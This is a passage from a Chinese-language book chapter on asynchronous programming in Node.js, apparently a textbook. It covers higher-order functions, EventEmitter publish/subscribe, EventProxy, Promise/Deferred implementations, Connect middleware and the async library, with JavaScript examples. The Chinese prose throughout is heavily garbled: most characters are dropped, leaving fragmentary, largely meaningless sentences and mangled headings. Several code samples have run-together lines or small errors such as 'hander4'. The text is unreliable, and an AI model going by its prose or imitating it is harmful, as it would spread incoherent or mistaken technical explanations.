在 JavaScript 中时，我们会上的定。这不复杂，只有个数的定，是在的问题是我们要复定一些相的数，有多的 isXXX()，就会多的余。为了解决复定的问题，我们入一个新数，这个新数可以工一样量创一些的数。在下的中，我们过 isType()数定 type 的，后一个新的数
var isType = function (type) { return function (obj) { return toString.call(obj) == '[object ' + type + ']'; }; };
var isString = isType('String'); var isFunction = isType('Function');
可以，入 isType()数后，创 isString()、isFunction()数就多了。这过定部分数产生一个新的定数的就是数。数应用在编程中也分，Underscore 的 after()是数应用，定下
*.after = function(times, func) { if (times <= 0) return func(); return function() {
if (--times < 1) { return func.apply(this, arguments); } }; };
这个数可以入的 times 数，生一个要用多次才实数的数。

## 4.2 异步编程的优势与难点

经的线程在 I/O 的下，由于 I/O 用，在应用 CPU 与 I/O。为了编程人的阅读习，I/O 了很多年。在新月的技术大前，性能问题在了编程人的前。性能的过多用多线程的解决，是多线程的入在务的也不。从作系统多线程的上下开，到实编程的、问题，开发人的时候也并不。一个解决 I/O 性能的是过 C/C++用作系统接，自己工 I/O，这能到很高的性能，是试开发门分高，在务解决问题上，要大的。Node 用 JavaScript 内部，接到务，这是一创新。
4.2.1
Node 的最大性过于于事驱动的 I/O
，这是它的灵在。I/O 可以使 CPU 与 I/O 并不相，源到好的用。对于网应用言，并的想大，开的是分。并使个之能有组织起，这也是 Node 在中广的因，图 4-1 为 I/O 用的图。

图 4-1 I/O 用的图用统的 I/O，分中性能的会是的，图 4-2。

图 4-2 I/O 用图
在 3 中，我们过 Node 实 I/O 的。用事环的，JavaScript 线程像一
个分务的大管，I/O 线程的个 I/O 线程都是小，分的务，小与管之不，以可以的高。这个用事环的经
在很多都在应用，最的是 UI 编程，iOS 应用开发。这个的在于管过多的性务，多，会到务的，管个不，小不到活，是的。言之，Node 是为了解决编程中 I/O 的性能问题的，用了线程，这 Node 像一个 I/O 问题的能，CPU 决于管的能。
在 1 中，从数的测试中可以到，这个管的能。的，C 语言是性能至，于 V8 性能的 Node 是一高，在的情下（用 C/C++），Node 的能可以之。
由于事环要应对海量请，海量请时作用在线程上，就要一个过多的 CPU 时。至于是，还是 I/O，只要不 I/O 的，就不问题。对 CPU 的用不要过 10 ms，者大量的分解为多的小量，过 setImmediate()。只要用 Node 的与 V8 的高性
能，就可以分发 CPUI/O 源的优势。

4.2.2
Node 编程，这也是编程次大在务。它 I/OV8 高性能，线程的性能，JavaScript 在后端到实用。一，它也统一了前后端 JavaScript 的编程。对于编程的新与不，开发者们有着不程的。接下，我们一下编程的，以好用 Node。

1. 1
   过我们时，使用 Java 的
   try/catch/final 语，下
   try {
   JSON.parse(json);
   } catch (e) {
   // TODO
   }
   是这对于编程言并不一定用。3 到过，I/O 的实要包个请。这个中有事环的，者不关
   。在
   一个请后立，因为并不一定发生在这个，try/catch 的在不会发作用。的定下
   var async = function (callback) {
   process.nextTick(callback);
   };
   用 async()后，callback 起，到下一个事环（Tick）才会。试对 try/catch 作只能次事环内的，对 callba
   ck 时的能为，下
   try { async(callback); } catch (e) { // TODO }
   Node 在上了一定，作为数的一个实，为，
   用没有
   async(function (err, results) { // TODO });
   在我们自编写的上，也要这样一些一用者入的数用者。下
   var async = function (callback) {
   process.nextTick(function() { var results = something; if (error) {
   return callback(error); } callback(null, results);
   }); };
   在的编写中，一个的是对用的数，下
   try { req.body = JSON.parse(buf, options.reviver); callback();
   } catch (err){ err.body = buf; err.status = 400; callback(err);
   }
   上的图是 JSON.parse()中可能的，是不小心包了用的数。这着数中有，会入 catch()中，于是数会次。这不是的情，可能务。的应为
   try { req.body = JSON.parse(buf, options.reviver); } catch (err){ err.body = buf;
   err.status = 400;
   return callback(err);
   }
   callback();
   在编写时，只要用的可，过多。
2. 2
   这是 Node 人最多的。在前端开发中，DOM 事相对言不会在相要多个事一起作的场景，在多的情。下的为立的 DOM 事定
   $(selector).click(function (event) { 
// TODO 
}); 
$(selector).change(function (event) {
   // TODO
   });
   是对于 Node 言，事务中在多个用的场景是。一个遍目的作，下
   fs.readdir(path.join(\_\_dirname, '..'), function (err, files) { files.forEach(function (filename, index) { fs.readFile(filename, 'utf8', function (err, file) { // TODO }); }); });
   对于上场景，由于次作在关系，数的为也情有可。，在网页的过程中，要数、、源，这者相之并不，最中者一不可。用认的用，程序也会下
   fs.readFile(template_path, 'utf8', function (err, template) { db.query(sql, function (err, data) { l10n.get(function (err, resources) { // TODO }); }); });
   这在的上是没有问题的，问题在于这并没有用好 I/O 的并优势。这是编程的问题，为有人，因为的深，最的从 Node 中生。是实情没有想，且后解决问题。
3. 3
   对于入 JavaScript 不的开发者，这门编程语言没有 sleep()这样的线程能，能用于时作的只有 setInterval()setTimeout()这个数。是人的是，这个数并不能后续的续。以，有多的开发者会写下这样的实 sleep(1000)的
   // TODO
   var start = new Date();
   while (new Date() - start < 1000) {
   // TODO
   }
   //阻塞的代码
   是事实是的，这会续用 CPU，与的线程相甚，
   了事环的。由于 Node 线程的因，CPU 源都会用于为这服务，余请都会不到应。这样的时，在统一务之后，用 setTimeout()的会好。
4. 4
   我们在 JavaScript 的时候，的是一线程上的，这在中的是
   JavaScript 线程与 UI 用的一个线程在 Node 中，只是没有 UI 的部分，本相。4 对于服务端言，服务是多 CPU，个 Node 程实质上是没有分用多 CPU 的。着今务的复杂，对于多 CPU 用的要也高。了 WebWorkers，它过 JavaScript 与 UI 分，可以很好用多 CPU 为大量服务。时前端 Web Workers 也是一个用机使用多 CPU 的想。图 4-3 为 WebWorkers 的工作图。

图 4-3 Web Workers 的工作图
在于前端在对的后性，Web Workers 并没有广应用起。外 Web Workers 能解决用 CPUUI，是不能解决 UI 的问题。Node 了这个，child_process 是 API，cluster 是深次的应用。
WebWorkers 的，开发人要多线程的编程，这对于以的 JavaScript 编程经是的。在 9 中，我们分 Node 的程，以开这部分内。

5. 5
   习编程的学，也能从对编程的产品，、务分问题。Node 了绝大部分的 API 量的 API，的会因为没有 API 开发者从。目前，Node 中试图编程，并不能到生，要者编实。对于用，过好的程，还是能序的。

## 4.3 异步编程解决方案

前了因编程的一些问题，与编程的性能相，编程过程起没有想中好，是事实也没有。与问题相，解决问题的是多，本开个的解决。
目前，编程的要解决有下 3。
事发/阅
。
. Promise/Deferred。

程。
4.3.1/
事是一广用于编程的，是数的事，发/阅。
Node 自的 events（http://nodejs.org/docs/latest/api/events.html）是发/阅的一个实，Node中部分都继自它，这个前端中的大量DOM事，不在事，也不在preventDefault()、stopPropagation()stopImmediatePropagation()事的。它有addListener/on()、once()、removeListener()、removeAllListeners()emit()本的事的实。事发/阅的作极，下
//订阅

emitter.on("event1", function (message) {
console.log(message);
});
//发布
emitter.emit('event1', "I am message!");
可以到，阅事就是一个高数的应用。事发/阅可以实一个事与多
个数的关，这些数为事。过 emit()发事后，会立前事的有。可以很灵活加，使事之可以很关解。
事发/阅自并用的问题，在 Node 中，emit()用多是事环触发的，以我们事发/阅广应用于编程。

事发/阅用解务，事发者关阅的实务，甚至不用关有多个在，数过的可以很灵活。在一些场景中，可以过事发/阅组，不的部分在组内部，、自定的部分过事外部，这是一的分。在这事发/阅组中，事的要，因为它关外部用组时是否优，从事的就是组的接。
从一个，事也是一（hook）机，用内部数
外部的用者。
Node 中的很多对大多有的，能，不过事的，我们就对在的中内部。这过事的，可以使编程者不用关组是动的，只关在要的事上可。下的 HTTP 请是场景
var options = { host: 'www.google.com', port: 80, path: '/upload', method: 'POST'
};
var req = http.request(options, function (res) { console.log('STATUS: ' + res.statusCode); console.log('HEADERS: ' + JSON.stringify(res.headers)); res.setEncoding('utf8'); res.on('data', function (chunk) {
console.log('BODY: ' + chunk); }); res.on('end', function () {
// TODO
}); }); req.on('error', function (e) {
console.log('problem with request: ' + e.message); }); // write data to request body req.write('data\n'); req.write('data\n'); req.end();
在这 HTTP 请的中，程序只要线在 error、data、end 这些务事上可，至于内部的程，过于关。一的是，Node 对事发/阅的机做了一些外的，这大多是于性的。下为个的。
对一个事加了过 10 个，会到一。这一与 Node 自线程有关，者认为多可能内，以在这样一。用 emitter.setMaxListeners(0)可以这个。一，由于事发会起一系，事相关的过多，可能在过多用 CPU 的情景。
为了，EventEmitter 对对 error 事了对。的触发了 error 事，EventEmitter 会是否有对 error 事加过。加了，这个会由，否这个会作为。外部没有这个，会起线程。一个的 EventEmitter 实应对 error 事做。

1. events
   实一个继 EventEmitter 的是分的，以下是 Node 中 Stream 对继 EventEmitter 的
   var events = require('events');
   function Stream() {
   events.EventEmitter.call(this); } util.inherits(Stream, events.EventEmitter);
   Node 在 util 中了继的，以可以很用。开发者可以过这样的继 EventEmitter，用事机解决务问题。在 Node 的心中，有数都继自 EventEmitter。
2.

在事阅/发中，也有一个 once()，过它加的只能一次，在之后就会它与事的关。这个性可以我们过一些复性的事应。下我们一下用 once()解决问题。
在机中，由于在内中，问分，用于加数问，绝大多数的请不复做一些的数读。问题，就是在高问量、大并发量的情下的情景，时大量的请时入数中，数时大的请，前到网的应。
以下是一数语的用
var select = function (callback) { db.select("SQL", function (results) { callback(results); }); };
好动，这时中是不在数的，问量大，一 SQL 会发到数中反复，会服务的性能。一是加一个，相关下
var status = "ready"; var select = function (callback) {
if (status === "ready") { status = "pending"; db.select("SQL", function (results) {
status = "ready"; callback(results); }); } };
是在这情景下，续多次用 select()时，只有一次用是生的，后续的 select()是没有数服务的，这个时候可以入事，相关下
var proxy = new events.EventEmitter();
var status = "ready";
var select = function (callback) {
proxy.once("selected", callback);
if (status === "ready") {
status = "pending";
db.select("SQL", function (results) {
proxy.emit("selected", results);
status = "ready";
});
}
};
这我们用了 once()，有请的都入事中，用一次就会的，一个只会一次。对于相的 SQL 语，在一个开始到的过程中只有一次。SQL 在时，新到的相用只在中数就可，一，到的可以这些用使用。这能复的数用产生的开。由于 Node 线程的因，心问题。这实也可以应用到他程用的场景中，使外部没有，也能有复开。
可能因为在过多发的，要用 setMaxListeners(0)，者大的。
once()产生的，也可以在的 Gearman 应用中实。在 JavaScript 中，实这个分。

3.

事发/阅有着它的优。用高数的优势，作为数可以加，它开发者时可能加的务。也可以务，务的一。一言，事与的关系是一对多，在编程中，也会事与的关系是多对一的情，也就是一个务可能个过事的。前的过深的因是。
这我们试过生解决 2 中为了最的可以并用实只能的问题。我们的目是要享 I/O 的性能，也要好的编。这以页要的读、数读本源读为要一下，相关下
var count = 0;
var results = {};
var done = function (key, value) {
results[key] = value;
count++;
if (count === 3) {
//渲染面
render(results);
} };
fs.readFile(template_path, "utf8", function (err, template) {
done("template", template); }); db.query(sql, function (err, data) {
done("data", data); }); l10n.get(function (err, resources) {
done("resources", resources); });
由于多个场景中数的并不能序，且数之相没有，以要一个数量作的。，我们这个用于测次数的量做。的你也已经想到用数量数的关系了，相关下
var after = function (times, callback) { var count = 0, results = {}; return function (key, value) {
results[key] = value; count++; if (count === times) {
callback(results); } }; };
var done = after(times, render);
上实了多对一的目的。务继续，我们可以继续用发/阅多对多的，相关下
var emitter = new events.Emitter(); var done = after(times, render);
emitter.on("done", done); emitter.on("done", other);
fs.readFile(template_path, "utf8", function (err, template) {
emitter.emit("done", "template", template); }); db.query(sql, function (err, data) {
emitter.emit("done", "data", data); }); l10n.get(function (err, resources) {
emitter.emit("done", "resources", resources); });
这了前者用的数多对一的收事阅/发中一对多的发。在上的中，有一个用者不服的问题，就是用者要这个 done()数，以在数中要从中数一个一个，。
一个是自者自己写的 EventProxy，它是对事阅/发的，可以自由阅组事。由于用的是事阅/发，与 Node 分，相关下
var proxy = new EventProxy();
proxy.all("template", "data", "resources", function (template, data, resources) { // TODO });
fs.readFile(template_path, "utf8", function (err, template) {
proxy.emit("template", template); }); db.query(sql, function (err, data) {
proxy.emit("data", data); }); l10n.get(function (err, resources) {
proxy.emit("resources", resources); });
EventProxy 了一个 all()阅多个事，个事都触发之后，才会。外的一个是 tail()，它与 all()的区在于 all()的在之后只会一次，tail()的在时一次之后，组事中的个事次触发，会用最新的数继续。
all()的一个是在中数的数与阅组事的事是一对应的。
之外，在的场景下，我们要从一个接多次读数，时触发的事是相的。EventProxy 了 after()实事在多次后的一事组阅，下
var proxy = new EventProxy();
proxy.after("data", 10, function (datas) { // TODO });
这 10 次 data 事后。这个到的数为 10 次事触发次序序的数组。EventProxy 了可以应用于 Node 中外，还可以用在前端中。

4. EventProxy
   EventProxy 自于 Backbone 的事，Backbone 的事是 Model、View 的
   能，在前端有广的使用。它在个 all 事触发时都会触发一次 all 事，相关下
   // Trigger an event, firing all bound callbacks. Callbacks are passed the // same arguments as `trigger` is, apart from the event name. // Listening for `"all"` passes the true event name as the first argument trigger : function(eventName) {
   var list, calls, ev, callback, args; var both = 2; if (!(calls = this.\_callbacks)) return this;
   while (both--) { ev = both ? eventName : 'all'; if (list = calls[ev]) {
   for (var i = 0, l = list.length; i < l; i++) { if (!(callback = list[i])) { list.splice(i, 1); i--; l--;
   } else { args = both ? Array.prototype.slice.call(arguments, 1) : arguments; callback[0].apply(callback[1] || this, args);
   } }
   } } return this;
   }
   EventProxy 是 all 做一个事的，在中入一些务一事解决的问题。的还有 all()、tail()、after()、not()any()。
5. EventProxy
   EventProxy 在事发/阅的上还了。在中，要用一定的。在过一时内，我们都是过外加 error 事统一的，大下
   exports.getContent = function (callback) { var ep = new EventProxy();
   ep.all('tpl', 'data', function (tpl, data) { //成功回调 callback(null, {
   template: tpl, data: data
   }); }); // error 事件 ep.bind('error', function (err) {
   //载有处理函数 ep.unbind(); //异常回调 callback(err);
   }); fs.readFile('template.tpl', 'utf-8', function (err, content) {
   if (err) { //发生异常给 error 事件的处理函数处理 return ep.emit('error', err);
   }
   ep.emit('tpl', content); }); db.get('some sql', function (err, result) {
   if (err) { //发生异常给 error 事件的处理函数处理 return ep.emit('error', err);
   } ep.emit('data', result); }); };
   因为的因，量一下多起了，EventProxy 在实践过程中了这个问题，相关下
   exports.getContent = function (callback) { var ep = new EventProxy();
   ep.all('tpl', 'data', function (tpl, data) { //成功回调 callback(null, {
   template: tpl, data: data
   }); }); //定错误处理函数 ep.fail(callback);
   fs.readFile('template.tpl', 'utf-8', ep.done('tpl')); db.get('some sql', ep.done('data')); };
   在上中，EventProxy 了 fail()done()这个实优，使开发者关在务部分，不是在上。关于 fail()的实，可以以下的
   ep.fail(callback);
   上这于下的
   ep.fail(function (err) { callback(err); });
   于
   ep.bind('error', function (err) { // 载有处理函数 ep.unbind(); // 异常回调 callback(err);
   });
   done()的实，也可以下的
   ep.done('tpl');
   它于
   function (err, content) {
   if (err) { //发生异常给 error 事件处理函数处理 return ep.emit('error', err);
   } ep.emit('tpl', content); }
   时，done()也接一个数作为数，相关下
   ep.done(function (content) { // TODO // 异常 ep.emit('tpl', content);
   });
   这于
   function (err, content) {
   if (err) { //发生异常给 error 事件的处理函数处理 return ep.emit('error', err);
   }
   (function (content) { // TODO //异常 ep.emit('tpl', content);
   }(content)); }
   只入一个数时，要工用 emit()触发事。一个是时入事数，相关下
   ep.done('tpl', function (content) { // content.replace('s', 'S'); // TODO // 关注异常 return content;
   });
   在这下，我们在数中事的触发，只过的数可。的在 done()中用作事的数触发。这的 fail()done()分 Promise 中的 fail()done()。言，这可以作事发/阅 Promise 的。这样的了程序的性，时也了量。
   4.3.2Promise/Deferred
   使用事的时，程要定。是分，也要定，这是由发/阅的机决定的。下为的 Ajax 用
   $.get('/api', { success: onSuccess, error: onError, complete: onComplete 
}); 
在上的用中，目。是否有一用，的是Promise/Deferred。Promise/Deferred在JavaScript中最于Dojo的中，广为自于jQuery1.5本，本几写了Ajax部分，使用Ajax时可以过下的
$.get('/api') .success(onSuccess) .error(onError) .complete(onComplete);
   这使使不用 success()、error()，Ajax 也会，这样的用入人一些。在始的 API 中，一个事只能一个，过 Deferred 对，可以对事加入的务，下
   \$.get('/api') .success(onSuccess1) .success(onSuccess2);
   Promise/Deferred 在 2009 年时 Kris Zyp 为一个，发在 CommonJS 中。着使用 Promise/Deferred 的应用多，CommonJS 目前已经了 Promises/A、Promises/B、Promises/D 这样的 Promise/Deferred，这使作可以以一优的。
   的广使用使、，是一深的，就会编程的不，Promise/Deferred 在一定程上解了这个问题。这我们着 Promises/A 以 Promise/Deferred。
6. Promises/A
   Promise/Deferred 实包部分，PromiseDeferred。这且不者的区是
   ，Promises/A 的为。Promises/A 对个作做了这样的定，下。. Promise 作只会在 3 的一、。
   . Promise 的只会从，不能反。
   不能相。. Promise 的一，不能。Promise 的图图 4-4。

图 4-4 Promise 的图
在 API 的定上，Promises/A 是的。一个 Promise 对只要 then()可。是对于 then()，有以下的要。
接、的。在作时，会用对应。
可 progress 事作为个。
. then()只接 function 对，余对。
. then()继续 Promise 对，以实用。then()的定下

then(fulfilledHandler, errorHandler, progressHandler)
为了 Promises/A，这我们试过继 Node 的 events 一个的实，相关下
var Promise = function () {
EventEmitter.call(this); }; util.inherits(Promise, EventEmitter);
Promise.prototype.then = function (fulfilledHandler, errorHandler, progressHandler) {
if (typeof fulfilledHandler === 'function') { //用 once()方法证成功回调执行 this.once('success', fulfilledHandler);
}
if (typeof errorHandler === 'function') { //用 once()方法证异常回调执行 this.once('error', errorHandler);
} if (typeof progressHandler === 'function') {
this.on('progress', progressHandler); } return this;
};
这到 then()做的事情是数起。为了个程，还要触发这些数的，实这些能的对为 Deferred，对，下
var Deferred = function () { this.state = 'unfulfilled'; this.promise = new Promise();
};
Deferred.prototype.resolve = function (obj) { this.state = 'fulfilled'; this.promise.emit('success', obj);
};
Deferred.prototype.reject = function (err) { this.state = 'failed'; this.promise.emit('error', err);
};
Deferred.prototype.progress = function (data) { this.promise.emit('progress', data); };
这的之的对应关系图 4-5。

图 4-5 之的对应关系
用 Promises/A 的，我们可以对一个的应对，相关下
res.setEncoding('utf8'); res.on('data', function (chunk) {
console.log('BODY: ' + chunk); }); res.on('end', function () {
// Done }); res.on('error', function (err) {
// Error });
上可以为下的
res.then(function () { // Done }, function (err) { // Error }, function (chunk) { console.log('BODY: ' + chunk); });
要实的 API，只要一下可，相关下
var promisify = function (res) { var deferred = new Deferred(); var result = ''; res.on('data', function (chunk) {
result += chunk;
deferred.progress(chunk); }); res.on('end', function () {
deferred.resolve(result); }); res.on('error', function (err) {
deferred.reject(err); }); return deferred.promise;
};
就到了的。这 deferred.promise 的目的是为了不外部程序用 resolve()reject()，内部的为由定者。下为定好 Promise 后的用
promisify(res).then(function () { // Done }, function (err) { // Error
}, function (chunk) { // progress console.log('BODY: ' + chunk);
});
这到 PromiseDeferred 的上。从上的可以，Deferred 要是用于内部，用于的 Promise 作用于外部，过 then()外部以加自定。PromiseDeferred 的关系图 4-6。

图 4-6 PromiseDeferred 关系图
与事发/阅相，Promise/Deferred 的 API 接都分。从图 4-6 中也可以，它务中不可的部分在了 Deferred 中，可的部分了 Promise。时问题就了，对于不的场景，都要 Deferred 部分，后才能到的接。场景不用，的时与的相并不一定。
Promise 是高接，事是接。接可以多复杂的场景，高接一定，不，不有接的灵活性，对于解决问题有。Promises/A 的在几 Promise 中相对。
这一下 Q。Q 是 Promises/A 的一个实，可以过 npm install q 使用。它对 Node 中数的 Promise 实下
/\*\*

-

Creates a Node-style callback that will resolve or reject the deferred

-

promise.

-

@returns a nodeback \*/

defer.prototype.makeNodeResolver = function () {
var self = this;
return function (error, value) {
if (error) {
self.reject(error); } else if (arguments.length > 2) { self.resolve(array_slice(arguments, 1)); } else { self.resolve(value); } }; };
可以到这是一个高数的使用，makeNodeResolver 了一个 Node 的数。对于 fs.readFile()的用，会为下
var readFile = function (file, encoding) { var deferred = Q.defer(); fs.readFile(file, encoding, deferred.makeNodeResolver()); return deferred.promise;
};
定之后的用下
readFile("foo.txt", "utf-8").then(function (data) { // Success case }, function (err) { // Failed case });
Promise 过用，实了用反用的分以，这使数相对优。
前分了 Q 对 Node 的。事实上，编程中要很多的，为了分情，我写了一个 memeda 用于 makeNodeResolver 相的事情。在下的用中可以到，分到个数中
var failing = require('memeda').failing;
fs.readFile(file, encoding, failing(function (err) { // TODO }).passing(function (data) { // TODO }));
我们可以对 Qmemeda 做。者相之在于分，使开发者关情。不之在于 Q 过 promise()可以实，以过多次用 then()加多
。可以到，Promise 要，是强大，很强的入性的数为量，能相对小。

2. Promise
   在 Promise 的中过，要解决的是个作中在的问题。到我们的，我们要多个用时，于 EventProxy，这了一个的实，相关下
   Deferred.prototype.all = function (promises) {
   var count = promises.length; var that = this; var results = []; promises.forEach(function (promise, i) {
   promise.then(function (data) { count--; results[i] = data; if (count === 0) {
   that.resolve(results); } }, function (err) { that.reject(err);
   }); }); return this.promise;
   };
   对于多次的读场景，以下的为，all()个的 Promise 新组一个新的 Promise
   var promise1 = readFile("foo.txt", "utf-8"); var promise2 = readFile("bar.txt", "utf-8"); var deferred = new Deferred(); deferred.all([promise1, promise2]).then(function (results) {
   // TODO }, function (err) { // TODO });
   这过 all()多个作。只有有作，这个作才，一中一个作，个作就。本的要用于 Promise 的，在熟上并 whenQ。在实的应用中，可以过 NPM 这个，它们是的 Promise 的实。
3. Promise
   在 API 的上，Promise 始的事触发为优，它的是要为不的场景不的 API，没有接的生事灵活。对于经的场景，API 的本也并不高，一做。
   Promise 的实在于对的作。这一个实的，我在自动测试时，要程服务之多次发，这些是序次的。在 Node 中，网是的，在编程实像他语言的用。由于网都是由前端工程的，用 JavaScript 编写自动测试可以他们环境的，以不能因为用就 Node。解决用问题的也就是用 Deferred。
   在有一组的 API，为了一事情，我们的大下
   obj.api1(function (value1) { obj.api2(value1, function (value2) { obj.api3(value2, function (value3) { obj.api4(value3, function (value4) {
   callback(value4); }); }); }); });
   由于有个次的，以。样我们会到的，过 10 个续就会分。于是我们到了 Pyramid ofDoom，为中，是。相信初入 Node 的人，也写过不。
   下我们过的数上的试开
   var handler1 = function (value1) {
   obj.api2(value1, handler2); }; var handler2 = function (value2) {
   obj.api3(value2, handler3); }; var handler3 = function (value3) {
   obj.api4(value3, hander4); }; var handler4 = function (value4) {
   callback(value4); });
   obj.api1(handler1);
   对于喜欢用事的开发者，我们开后的会是样的情下
   var emitter = new event.Emitter();
   emitter.on("step1", function () { obj.api1(function (value1) { emitter.emit("step2", value1); }); });
   emitter.on("step2", function (value1) { obj.api2(value1, function (value2) { emitter.emit("step3", value2); }); });
   emitter.on("step3", function (value2) { obj.api3(value2, function (value3) { emitter.emit("step4", value3); }); });
   emitter.on("step4", function (value3) { obj.api4(value3, function (value4) { callback(value4); }); });
   emitter.emit("step1");
   用事开后的了。与相，量加了，这不会好的编程。为，我们要一好的。
   的 Promise
   想的编程应是前一个的用作为下一个用的开始，是中的用，相关下
   promise() .then(obj.api1) .then(obj.api2) .then(obj.api3) .then(obj.api4) .then(function (value4) {
   // Do something with value4 }, function (error) {
   // Handle any error from step1 through step4 }) .done();
   试一下以实用，下
   var Deferred = function () { this.promise = new Promise(); };
   //成态
   Deferred.prototype.resolve = function (obj) { var promise = this.promise; var handler; while ((handler = promise.queue.shift())) {
   if (handler && handler.fulfilled) { var ret = handler.fulfilled(obj); if (ret && ret.isPromise) {
   ret.queue = promise.queue; this.promise = ret; return;
   } } } };
   //态
   Deferred.prototype.reject = function (err) { var promise = this.promise; var handler; while ((handler = promise.queue.shift())) {
   if (handler && handler.error) { var ret = handler.error(err); if (ret && ret.isPromise) {
   ret.queue = promise.queue; this.promise = ret;
   4.3 91  
   return;  
   }  
   }  
   }  
   };  
   //生成回调函数
   Deferred.prototype.callback = function () {  
   var that = this;  
   return function (err, file) {  
    if (err) {  
   return that.reject(err);
   }  
    that.resolve(file);  
   };  
   };  
   4  
   var Promise = function () {  
   // 队列用存执行的回调函数
   this.queue = [];  
   this.isPromise = true;  
   };  
   Promise.prototype.then = function (fulfilledHandler, errorHandler, progressHandler) {  
   var handler = {};  
   if (typeof fulfilledHandler === 'function') {  
    handler.fulfilled = fulfilledHandler;  
   }  
   if (typeof errorHandler === 'function') {  
    handler.error = errorHandler;  
   }  
   this.queue.push(handler);  
   return this;  
   };  
   这我们以次读作为，以的可性。这读个 是
   于一个 中的内的，相关下
   var readFile1 = function (file, encoding) {  
   var deferred = new Deferred();  
   fs.readFile(file, encoding, deferred.callback());  
   return deferred.promise;  
   };  
   var readFile2 = function (file, encoding) {  
   var deferred = new Deferred();  
   fs.readFile(file, encoding, deferred.callback());  
   return deferred.promise;  
   };  
   readFile1('file1.txt', 'utf8').then(function (file1) {  
   return readFile2(file1.trim(), 'utf8');  
   }).then(function (file2) {  
   console.log(file2);  
   });

这为 sequence.js。，会到以下的
\$ node sequence.js I am file2
要 Promise，要过以下个。(1) 有的都到中。
(2) Promise 时，个，一测到了新的 Promise 对，，后
前 Deferred 对的 promise 用为新的 Promise 对，并中余下的它。写到这，你是否了优次，这的要用于研 Promise 的实。在多的优，Q 者
whenPromise 做好，实应用时请用这些熟。. API Promise 这会发，为了好的 API，要做多的工作。这了一个可以
量 Promise，相关下
// smooth(fs.readFile); var smooth = function (method) {
return function () { var deferred = new Deferred(); var args = Array.prototype.slice.call(arguments, 1); args.push(deferred.callback()); method.apply(null, args); return deferred.promise;
}; };
于是前的次读的
var readFile1 = function (file, encoding) { var deferred = new Deferred(); fs.readFile(file, encoding, deferred.callback()); return deferred.promise;
};
var readFile2 = function (file, encoding) { var deferred = new Deferred(); fs.readFile(file, encoding, deferred.callback()); return deferred.promise;
};
可以为
var readFile = smooth(fs.readFile);
要实样的，量会到
var readFile = smooth(fs.readFile); readFile('file1.txt', 'utf8').then(function (file1) { return readFile(file1.trim(), 'utf8'); }).then(function (file2) {
// file2 => I am file2 console.log(file2); });
4.3.3
前了最为的事发/阅 Promise/Deferred，这些是经的者是写的解决，一者，就要为它们做多的工作。这一会一些的应用，，灵活。

1. Next
   了事 Promise 外，还有一是要工用才能续后续用的，我们做触发，的关是 next。事实上，触发目前应用最多的是 Connect 的中。
   这我们且不关 Connect 的应用，一下 Connect 的 API，相关下
   var app = connect(); // Middleware app.use(connect.staticCache()); app.use(connect.static(\_\_dirname + '/public')); app.use(connect.cookieParser()); app.use(connect.session()); app.use(connect.query()); app.use(connect.bodyParser()); app.use(connect.csrf()); app.listen(3001);
   在过 use()好一系中后，端上的请。中用了触发的机，最的中下
   function (req, res, next) { // 中间件}
   个中请对、应对触发数，过一个，图 4-7。

图 4-7 中过一个
中机使在网请时，可以像编程一样过、、能，不与务产生关，以产生。
下我们 Connect 的心实，相关下
function createServer() { function app(req, res){ app.handle(req, res); } utils.merge(app, proto); utils.merge(app, EventEmitter.prototype); app.route = '/'; app.stack = []; for (var i = 0; i < arguments.length; ++i) {
app.use(arguments[i]); } return app;
};
这过下创了 HTTP 服务的 request 事数
function app(req, res){ app.handle(req, res); }
的心是 app.stack = [];这。stack 性是这个服务内部的中。
过用 use()我们可以中中。下的为 use()的要部分
app.use = function(route, fn){ // some code this.stack.push({ route: route, handle: fn });
return this; };
时就好了。接下，Node 生 http 实可。数的实下
app.listen = function(){ var server = http.createServer(this); return server.listen.apply(server, arguments);
};
最到 app.handle()，一个到的网请都从这开始。的下
app.handle = function(req, res, out) { // some code next();
};
始的 next()为复杂，下是后的内，分，中的中并，时入前以实用，到续触发的目的
function next(err) { // some code // next callback layer = stack[index++];
layer.handle(req, res, next); }
有编程复杂的开发者可以 Connect 的，这对于分务、有。
的是，管中这触发并不要个中都是的，是个都用，实上只是的，没办过并的用务的
。可以一些的，是并还是要事者 Promise 的，这样务在都能自。
在 Connect 中，触发分网请的场景。复杂的解为、一的，次请对应对。

2. async
   接下，我们要最的程 async。asyncNPM 的前，可在 Node 开发中，程是开发过程中的本。async 了 20 多个用于的作，这我们几用。
   的
   这我们用前读个的，一下 async 是解决问题的。async 了 series()实一组务的，下
   async.series([ function (callback) {
   fs.readFile('file1.txt', 'utf-8', callback); }, function (callback) {
   fs.readFile('file2.txt', 'utf-8', callback); } ], function (err, results) { // results => [file1.txt, file2.txt] });
   这于
   fs.readFile('file1.txt', 'utf-8', function (err, content) { if (err) {
   return callback(err); } fs.readFile('file2.txt ', 'utf-8', function (err, data) {
   if (err) {
   return callback(err); } callback(null, [content, data]);
   }); });
   这的是数。可以发，series()中入的数 callback()并由使用者定。事实上，的数由 async 过高数的入，这了的。个 callback()时会起，后下一个用，到有用。最的数时，的用的以数组的入。这的是一，就有用，并最数的一个数。
   的
   我们要过并性能时，async 了 parallel()，用以并一些作。以下为读个的并本
   async.parallel([ function (callback) {
   fs.readFile('file1.txt', 'utf-8', callback); }, function (callback) {
   fs.readFile('file2.txt', 'utf-8', callback); } ], function (err, results) { // results => [file1.txt, file2.txt] });
   上这于下的
   var counter = 2; var results = []; var done = function (index, value) {
   results[index] = value; counter--; if (counter === 0) {
   callback(null, results); } };
   //传递异常 var hasErr = false; var fail = function (err) {
   if (!hasErr) { hasErr = true; callback(err);
   } };
   fs.readFile('file1.txt', 'utf-8', function (err, content) { if (err) {
   return fail(err); } done(0, content);
   }); fs.readFile('file2.txt', 'utf-8', function (err, data) { if (err) {
   return fail(err); } done(1, data);
   });
   样，过 async 编写的没有深的，也没有复杂的，它的自于入的数。parallel()对于的是一个用产生了，就会作为一个数入最的数。只有有用都时，才会以数组的入。也你还 EventProxy 的，下
   var EventProxy = require('eventproxy');
   var proxy = new EventProxy(); proxy.all('content', 'data', function (content, data) {
   callback(null, [content, data]); }) proxy.fail(callback);
   fs.readFile('file1.txt', 'utf-8', proxy.done('content')); fs.readFile('file2.txt', 'utf-8', proxy.done('data'));
   与过 async 编写产生的量相并不大。EventProxy 于事发/阅，也用到了与 async 相的，过的数的。不的是，在 async 的下，这个数由 async 后，EventProxy 过 done()fail()4 生新的数。这实都是高数的应用。
   的
   series()的，前一个的是后一个用的入时，series()就了。，这场景的，async 了 waterfall()，相关下
   async.waterfall([ function (callback) { fs.readFile('file1.txt', 'utf-8', function (err, content) { callback(err, content);
